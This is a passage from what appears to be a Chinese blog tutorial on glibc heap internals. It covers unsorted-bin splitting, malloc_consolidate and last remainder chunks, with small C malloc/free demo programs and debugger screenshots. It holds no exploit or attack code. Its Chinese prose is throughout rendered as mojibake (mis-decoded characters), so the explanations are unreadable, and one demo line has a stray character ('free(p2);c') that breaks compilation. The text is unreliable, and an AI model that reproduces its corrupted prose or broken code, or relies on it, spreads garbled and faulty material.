class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>çœ‹ä¸€ä¸‹chunkçš„ä¿¡æ¯</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215201134939.png" alt="image-20201215201134939"></p><p>free p1ï¼Œå°†p1æ”¾å…¥äº†unsorted binä¸­</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215201206634.png" alt="image-20201215201206634"></p><p>åˆ†é…p3 å¯ä»¥çœ‹åˆ°æ˜¯ç›´æ¥è¦†ç›–p1çš„åœ°æ–¹</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215201235306.png" alt="image-20201215201235306"></p></blockquote><h5 id="åˆ‡å‰²ä¸€å—chunkï¼ˆunsorted-binï¼‰"><a href="#åˆ‡å‰²ä¸€å—chunkï¼ˆunsorted-binï¼‰" class="headerlink" title="åˆ‡å‰²ä¸€å—chunkï¼ˆunsorted binï¼‰"></a><strong>åˆ‡å‰²ä¸€å—chunkï¼ˆunsorted binï¼‰</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">void</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//ä¸ºäº†é˜²æ­¢pè¢«topchunkåˆå¹¶</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹p2åˆ†é…ä¹‹å</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215201554898.png" alt="image-20201215201554898"></p><p>è¿™é‡Œä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ä¸ªæƒ…å†µå‘¢ï¼Ÿ</p><p>å…¶å®å®ƒæ˜¯åœ¨unsorted binä¸­åˆ‡å‰²äº†ä¸€å—ç¬¦åˆè‡ªå·±å¤§å°çš„chunk æ‹¿å‡ºæ¥åˆ†é…</p></blockquote><p><strong>åˆ†å‰²ä¸€å—è¾ƒå¤§çš„free chunkï¼ˆunsorted binï¼‰</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">void</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//ä¸ºäº†é˜²æ­¢pè¢«topchunkåˆå¹¶</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);c</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ ¹æ®ä¸Šé¢çš„ç†è®ºè¿™å›å°±åº”è¯¥å»top chunkä¸­åˆ‡å‰²äº† äº‹å®ä¹Ÿç¡®å®å¦‚æ­¤</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215202105325.png" alt="image-20201215202105325"></p></blockquote><p>ç»è¿‡ä»¥ä¸Šæ¼”ç¤ºæˆ‘ä»¬ä¸éš¾å¾—å‡ºä¸€ä¸‹ç»“è®º</p><ol><li>åªè¦åˆ‡å‰²å¤§å°æ­£å¥½ å®ƒå°±ä¼šä»å·²freeçš„chunkä¸­å¯»æ‰¾</li><li>å…³äºfastbin å’Œ unsorted binä¸­free chunkåˆ†é…æ˜¯ä¸ä¸€æ ·çš„</li><li>å¦‚æœè¾ƒå¤§ ä¼šä»top chunkä¸­å¯»æ‰¾</li></ol><h4 id="3-freeçš„æœºåˆ¶"><a href="#3-freeçš„æœºåˆ¶" class="headerlink" title="3.freeçš„æœºåˆ¶"></a>3.freeçš„æœºåˆ¶</h4><ul><li>â‘ å¦‚æœfreeçš„chunkçš„å¤§å°åœ¨0x20~0x80ä¹‹é—´ï¼ˆfastbinçš„èŒƒå›´ï¼‰ï¼Œé‚£ä¹ˆè¯¥chunkç›´æ¥æ”¾åˆ°fast binä¸Š</li><li>â‘¡å¦‚æœfreeçš„chunkçš„å¤§å°å¤§äº0x80ï¼ˆå¤§äºfast binçš„èŒƒå›´ï¼‰ï¼Œæ­¤æ—¶ä¸ä¼šç›´æ¥æ”¾åˆ°small binæˆ–è€…large binä¸Šé¢ã€‚è€Œæ˜¯æ”¾åˆ°unsorted binä¸Šé¢</li></ul><h3 id="0x13-malloc-consolidate"><a href="#0x13-malloc-consolidate" class="headerlink" title="0x13 malloc_consolidate"></a>0x13 malloc_consolidate</h3><p><strong>è¿™ä¸ªä¸»è¦æ˜¯è§£å†³unsorted binä¸­çš„ç¢ç‰‡åŒ–ï¼Œæ•´åˆæˆæ–°çš„binï¼Œä¹Ÿå°±æ˜¯æ”¾å…¥small binæˆ–large binä¸­</strong></p><h4 id="1-consolidateçš„å®šä¹‰"><a href="#1-consolidateçš„å®šä¹‰" class="headerlink" title="1.consolidateçš„å®šä¹‰"></a>1.consolidateçš„å®šä¹‰</h4><ul><li>æˆ‘ä»¬çŸ¥é“å¤§äº0x80çš„chunkè¢«é‡Šæ”¾ä¹‹åå°±æ”¾åˆ°äº†unsortedbinä¸Šé¢å»ï¼Œä½†æ˜¯unsortedbinæ˜¯ä¸€ä¸ªæœªåˆ†ç±»çš„binï¼Œä¸Šé¢çš„chunkä¹Ÿå¤„äºæœªåˆ†ç±»çš„çŠ¶æ€ã€‚ä½†æ˜¯è¿™äº›chunkéœ€è¦åœ¨ç‰¹å®šçš„æ¡ä»¶ä¸‹è¢«æ•´ç†ç„¶åæ”¾å…¥åˆ°smallbinsæˆ–è€…largebinsä¸­</li><li>è¿™ä¸ªæ•´ç†çš„è¿‡ç¨‹è¢«ç§°ä¸ºunsortedbinçš„â€œconsolidateâ€ï¼Œä½†æ˜¯â€œconsolidateâ€æ˜¯è¦åœ¨ç‰¹å®šçš„æ¡ä»¶ä¸‹æ‰ä¼šå‘ç”Ÿçš„ï¼Œå¹¶ä¸”ä¸mallocç´§å¯†ç›¸å…³</li></ul><h4 id="2-è§¦å‘åœºæ™¯"><a href="#2-è§¦å‘åœºæ™¯" class="headerlink" title="2.è§¦å‘åœºæ™¯"></a>2.è§¦å‘åœºæ™¯</h4><ul><li>å½“æˆ‘ä»¬mallocä¸€ä¸ªchunkï¼Œè¿™ä¸ªchunkçš„å¤§å°å¤§äºsmallbinçš„èŒƒå›´ï¼Œåœ¨unsortedbinä¸­å¯»æ‰¾å¯ç”¨çš„freechunkä½¿ç”¨æ—¶ï¼Œä¼šè§¦å‘malloc_conlolidate</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190810155737453.png" alt="img"></p><ul><li>mallocæ—¶å¦‚æœbiné“¾ä¸­æ²¡æœ‰å¯ä»¥ä½¿ç”¨çš„freechunkï¼Œå¹¶ä¸”å»åˆ‡å‰²topchunkï¼Œå‘ç°topchunkä¹Ÿä¸å¤Ÿç”¨ï¼Œæ­¤æ—¶å›å»å†å»è°ƒç”¨malloc_consolidateè¿›è¡Œä¸€æ¬¡æ•´ç†</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190810155901661.png" alt="img"></p><ul><li>å‘ç°unsortedbinä¸­æœ‰å¤§çš„freechunkå¯ä»¥åˆ‡å‰²ç»™mallocä½¿ç”¨æ—¶ï¼Œåˆ‡å‰²unsortedbinï¼Œäº§ç”Ÿlast remainderçš„æ—¶å€™ä¼šconsolidate</li></ul><p><strong>ç€é‡å¼ºè°ƒï¼Œ1å’Œ2éƒ½ä¼šå»å¯»æ‰¾fastbinä¸­çš„free chunk</strong></p><h4 id="3-å…·ä½“åˆ†æ"><a href="#3-å…·ä½“åˆ†æ" class="headerlink" title="3.å…·ä½“åˆ†æ"></a>3.å…·ä½“åˆ†æ</h4><p><strong>å½“æˆ‘ä»¬mallocä¸€ä¸ªå¤§å°å¤§äºsmallbinçš„chunkæ—¶ï¼š</strong></p><ul><li><p><strong>ç¬¬ä¸€æ­¥ï¼š</strong>å°†fastbinsä¸­çš„chunkéƒ½æ•´ç†åˆ°unsortedbinä¸­ï¼Œæ•´ç†çš„è¿‡ç¨‹ä¸­å¦‚æœæœ‰ç‰©ç†ç›¸é‚»ä¸”ç©ºé—²çš„fastchunkå°±åˆå¹¶ï¼Œå¦‚æœfastchunkä¸topchunkç›¸é‚»ï¼Œé‚£ä¹ˆfastchunkå°±ä¸topchunkåˆå¹¶ï¼ˆè¿™ä¸ªè¿‡ç¨‹å‘ç”Ÿåœ¨_int_mallocå‡½æ•°è°ƒç”¨çš„malloc_consolidateå‡½æ•°ä¸­ï¼‰</p></li><li><p><strong>ç¬¬äºŒæ­¥ï¼š</strong>mallocå»æ£€æŸ¥unsortedbinä¸­æ˜¯å¦æœ‰ä¸è‡ªå·±mallocå¤§å°ç›¸å¯¹åº”çš„chunkå¯ä»¥ä½¿ç”¨ï¼Œå¦‚æœæœ‰ä¸è‡ªå·±mallocå¤§å°ç›¸å¯¹åº”çš„chunkå¯ä»¥ä½¿ç”¨å°±ç›´æ¥ä½¿ç”¨ï¼›å¦‚æœæ²¡æœ‰é‚£ä¹ˆå°±å»åˆ¤æ–­unsortedbinä¸­æ˜¯å¦æœ‰å¯ä»¥ç”¨æ¥åˆ‡å‰²çš„å¤§chunkå¯ä»¥ä½¿ç”¨ï¼Œå¦‚æœå¯ä»¥åˆ‡å‰²ï¼Œå°±åˆ‡å‰²å¤§çš„chunkä½¿ç”¨ï¼Œç„¶åäº§ç”Ÿlast remainderï¼ˆè¿™ä¸ªè¿‡ç¨‹å‘ç”Ÿåœ¨_int_mallocå‡½æ•°çš„forå¾ªç¯ä¸­ï¼‰</p></li><li><strong>ç¬¬ä¸‰æ­¥ï¼š</strong>å¦‚æœæ²¡æœ‰å¯ä»¥åˆ‡å‰²çš„å¤§chunkå¯ä»¥ä½¿ç”¨ï¼Œæ­¤æ—¶å°±å°†unsortedbinä¸Šçš„chunkæ”¾å…¥åˆ°å¯¹åº”çš„binsé“¾ä¸Š</li><li><strong>ç¬¬å››æ­¥ï¼š</strong>mallocä»ç¬¬ä¸€æ¬¡åˆ†é…çš„å¤§å †å—ä¸Šé¢æ‰¾ç©ºé—´æ¥ä½¿ç”¨</li></ul><h4 id="4-æ¼”ç¤ºä¸€"><a href="#4-æ¼”ç¤ºä¸€" class="headerlink" title="4.æ¼”ç¤ºä¸€"></a>4.æ¼”ç¤ºä¸€</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ‰“æ–­ç‚¹ çœ‹å †ä¿¡æ¯</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216141039796.png" alt="image-20201216141039796"></p><p>é‡Šæ”¾p1 çœ‹åˆ°è¿›å…¥fastbinä¸­</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216141113312.png" alt="image-20201216141113312"></p><p>åˆ†é…p2 å¯ä»¥çœ‹åˆ°æˆ‘ä»¬p1å¥½åƒæ˜¯è¢«è¦†ç›–äº†  æˆ‘ä»¬å…·ä½“æ¥è¯´ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216141143610.png" alt="image-20201216141143610"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201216141159043.png" alt="image-20201216141159043"></p><p>å½“åˆ†é…æ¯”small binå¤§çš„chunkæ—¶ï¼Œæˆ‘ä»¬å°±ä¼šè§¦å‘consolidateï¼Œ</p><ol><li>æˆ‘ä»¬çŸ¥é“fastchunkæ˜¯ä¸ä¼šåˆå¹¶çš„ æ‰€ä»¥å®ƒä»¬è¿™æ—¶å°±ä¼šè¿›å…¥unsortedbinä¸­</li><li>ç„¶åmallocå»åˆ‡å‰²unsortedbinä¸­çš„è¿™ä¸ªfreechunkï¼Œå‘ç°ä¸èƒ½å¤Ÿåˆ‡å‰²ï¼Œäºæ˜¯å°±æ”¾å…¥smallbinä¸­ï¼Œæ”¾å…¥smallbinä¸­ä¹‹åä¾¿æˆä¸ºsmallchunkäº†ï¼Œå°±å¯ä»¥ä¸topchunkåˆå¹¶äº†</li><li>åˆå¹¶ä¹‹åmallocä»topchunkä¸­ç”³è¯·ä¸€ä¸ªå †å—</li></ol></blockquote><h4 id="5-æ¼”ç¤ºäºŒ"><a href="#5-æ¼”ç¤ºäºŒ" class="headerlink" title="5.æ¼”ç¤ºäºŒ"></a>5.æ¼”ç¤ºäºŒ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>é‡Šæ”¾p1å’Œp</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216142837517.png" alt="image-20201216142837517"></p><p>ä¸‹é¢æˆ‘ä»¬çŒœæƒ³ä¼šå‘é€ä»€ä¹ˆ?</p><p>ç”±äºåˆ†é…chunkè¾ƒå¤§ æ‰€ä»¥æˆ‘ä»¬ä¼šè§¦å‘consolidate è¿™æ—¶ä¸¤ä¸ªfastchunkå°±ä¼šè¿›å…¥unsortedbinä¸­ æ ¹æ®ä¸Šé¢è§„åˆ™ å®ƒä¸‹ä¸€æ­¥å°±ä¼šè¿›å…¥small bins</p><p>åˆå› ä¸ºå’Œtop chunkç›¸é‚» æ‰€ä»¥top chunkä¼šåˆå¹¶ </p><p>ç›´è§‚æ„Ÿè§‰å°±æ˜¯æˆ‘ä»¬è¦†ç›–äº†ä¹‹å‰çš„chunk</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216143203315.png" alt="image-20201216143203315"></p></blockquote><h3 id="0x14-last-remainder"><a href="#0x14-last-remainder" class="headerlink" title="0x14 last remainder"></a>0x14 last remainder</h3><h4 id="1-å®šä¹‰"><a href="#1-å®šä¹‰" class="headerlink" title="1.å®šä¹‰"></a>1.å®šä¹‰</h4><ul><li>å¦‚æœåœ¨binsé“¾ä¸­å­˜åœ¨freechunkæ—¶ï¼Œå½“æˆ‘ä»¬å»mallocçš„æ—¶å€™ï¼Œmallocçš„è¯·æ±‚å¤§å°æ¯”freechunkçš„å¤§å°å°ï¼Œé‚£ä¹ˆarenaå°±ä¼šåˆ‡å‰²è¿™ä¸ªfreechunkç»™mallocä½¿ç”¨ï¼Œé‚£ä¹ˆåˆ‡å‰²ä¹‹åå‰©ä½™çš„chunkå°±<strong>è¢«ç§°ä¸ºâ€œlast remainderâ€</strong></li><li>å½“äº§ç”Ÿlast remainderä¹‹åï¼Œè¡¨ç¤ºarenaçš„<strong>malloc_stateç»“æ„ä½“ä¸­çš„last_remainderæˆå‘˜</strong>æŒ‡é’ˆå°±ä¼š<strong>è¢«åˆå§‹åŒ–</strong>ï¼Œå¹¶ä¸”æŒ‡å‘è¿™ä¸ªlast remainder</li></ul><h4 id="2-äº§ç”Ÿåœºæ™¯"><a href="#2-äº§ç”Ÿåœºæ™¯" class="headerlink" title="2.äº§ç”Ÿåœºæ™¯"></a>2.äº§ç”Ÿåœºæ™¯</h4><ul><li>mallocçš„æ—¶å€™ï¼Œä¸è®ºmallocçš„å¤§å°ï¼Œé¦–å…ˆä¼šå»æ£€æŸ¥æ¯ä¸ªbinsé“¾ï¼ˆå‡ºå»fastbinsé“¾ï¼‰æ˜¯å¦æœ‰ä¸mallocç›¸ç­‰å¤§å°çš„freechunkï¼Œå¦‚æœæ²¡æœ‰å°±å»æ£€æŸ¥binsé“¾ä¸­æ˜¯å¦æœ‰å¤§çš„freechunkå¯ä»¥åˆ‡å‰²ï¼Œå¦‚æœåˆ‡å‰²ï¼Œé‚£ä¹ˆå°±åˆ‡å‰²å¤§çš„freechunkï¼Œé‚£ä¹ˆåˆ‡å‰²ä¹‹åçš„chunkæˆä¸ºlast remainderï¼Œå¹¶ä¸”last remainderä¼šè¢«æ”¾å…¥åˆ°unsortedbinä¸­</li></ul><blockquote><p><strong>åˆ‡å‰²unsortedbinä¸­çš„å¤§chunkæ—¶ï¼š</strong></p><p>å½“unsortedbinæœ‰å¯¹åº”çš„freechunkå¯ä»¥ç»™mallocåˆ‡å‰²ä½¿ç”¨æ—¶ï¼Œunsortedbinä¼šå‘ç”Ÿä»¥ä¸‹æ­¥éª¤ï¼š</p><ul><li>â‘ å…ˆå°†è¿™äº›freechunkæ”¾ç½®åˆ°å¯¹åº”å¤§å°çš„binsé“¾ä¸Šï¼ˆæ”¾å…¥smallbinæˆ–largebinï¼‰</li><li>â‘¡æ”¾ç½®åˆ°å¯¹åº”çš„binsé“¾ä¸Šä¹‹åï¼Œåˆ‡å‰²æ­¤freechunk</li><li>â‘¢åˆ‡å‰²ä¹‹åä¼šäº§ç”Ÿlast remainderï¼Œå†å°†last remainderæ”¾åˆ°unsortedbinä¸Š</li></ul><p><strong>ä¾‹å¦‚ï¼š</strong></p><ul><li>æ­¤æ—¶ï¼Œunsortedbinæœ‰ä¸¤ä¸ª0x800çš„freechunk</li><li>æ­¤æ—¶ç”³è¯·ä¸€ä¸ª0x600çš„chunk</li><li>é‚£ä¹ˆunsortedbinä¼šå…ˆconsolidateï¼ŒæŠŠä¸¤ä¸ª0x800çš„freechunkå…ˆç§»åŠ¨åˆ°largebinä¸­</li><li>ç„¶åå†åˆ‡å‰²largebinçš„freechunkï¼Œå°†åˆ‡å‰²åä½™ç•™ä¸‹çš„0x200æ”¾å…¥unsortedbin</li></ul><p><strong>åˆ‡å‰²smallbinsã€largebinsä¸­çš„å¤§chunkæ—¶ï¼š</strong></p><ul><li>â‘ åˆ‡å‰²smallbinsæˆ–è€…largebinsä¸­çš„å¤§freechunkï¼Œäº§ç”Ÿlast remainder</li><li>â‘¡å°†last remainderæ”¾å…¥åˆ°unsortedbinä¸­</li></ul></blockquote><h4 id="3-last-remainderçš„consolidate"><a href="#3-last-remainderçš„consolidate" class="headerlink" title="3.last remainderçš„consolidate"></a>3.last remainderçš„consolidate</h4><p>å½“æˆ‘ä»¬åˆ‡å‰²ä¸€ä¸ªbinsé“¾ä¸­çš„å¤§chunkæ—¶äº§ç”Ÿlast reminaderæ—¶ï¼Œä¼šå‘ç”Ÿconsolidateï¼Œ<strong>ä½†æ˜¯æ­¤ç§consolidateä¸ä¼šå»æ•´ç†fastbinsä¸­çš„freechunkï¼ˆé‡ç‚¹ï¼‰</strong></p><h4 id="4-æ¼”ç¤ºä¸€-1"><a href="#4-æ¼”ç¤ºä¸€-1" class="headerlink" title="4.æ¼”ç¤ºä¸€"></a>4.æ¼”ç¤ºä¸€</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span> = <span class="number">0x120</span>;</span><br><span class="line">    <span class="keyword">void</span> *p = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *junk = <span class="built_in">malloc</span>(<span class="built_in">size</span>);  <span class="comment">//æ”¾ç½®é‡Šæ”¾på’Œqä¹‹åï¼Œpå’Œqå‘ç”Ÿåˆå¹¶</span></span><br><span class="line">    <span class="keyword">void</span> *q = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *r = <span class="built_in">malloc</span>(<span class="built_in">size</span>);   <span class="comment">//æ”¾ç½®é‡Šæ”¾qä¹‹åï¼Œqå’Œtopchunkå‘ç”Ÿåˆå¹¶</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p:0x%x\n"</span>,p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"q:0x%x\n"</span>,q);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"r:0x%x\n"</span>,r);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(p,<span class="string">"aaaaaaaabbbbbbbb"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(q,<span class="string">"ccccccccdddddddd"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(r,<span class="string">"eeeeeeeeffffffff"</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ–­ç‚¹</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216151435089.png" alt="image-20201216151435089"></p><p>é‡Šæ”¾på’Œq</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216151556927.png" alt="image-20201216151556927"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201216151633713.png" alt="image-20201216151633713"></p><p>åˆ†é…0x90  </p><ul><li>é¦–å…ˆä¸¤ä¸ªunsortedbin chunkä¸­å¯ä»¥åˆ†å‰²åˆ°0x90é‚£ä¹ˆå°±ä¼šconsolidate å°†å…¶å…¨éƒ¨æ”¾å…¥smallbinsä¸­</li><li>ä¹‹ååˆ†å‰²å…¶ä¸­ä¸€éƒ¨åˆ† å¹¶å°†å‰©ä½™çš„æ”¾å…¥lastremainder</li></ul><p><img src="/2020/12/15/%E5%A0%86/image-20201216151705158.png" alt="image-20201216151705158"></p></blockquote><h4 id="5-æ¼”ç¤ºäºŒ-1"><a href="#5-æ¼”ç¤ºäºŒ-1" class="headerlink" title="5.æ¼”ç¤ºäºŒ"></a>5.æ¼”ç¤ºäºŒ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x30</span>;</span><br><span 